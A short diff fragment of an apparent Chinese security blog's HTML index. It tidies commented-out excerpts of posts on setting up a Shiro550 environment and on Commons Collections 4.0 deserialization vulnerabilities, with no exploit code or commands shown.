-        Shiro550环境搭建：123git clone https://github.com/apache/shiro.gi
+        Shiro550环境搭建：git clone https://github.com/apache/shiro.git
+c
       </div> -->
     </a>
   </div>
@@ -812,7 +938,7 @@
       </div>
       <!-- <div class="content">
         CC2，4都是Common Collections 4.0版本下的反序列化漏洞。pom依赖：
-12345&lt;depe
+&lt;dependenc
       </div> -->
     </a>
   </div>
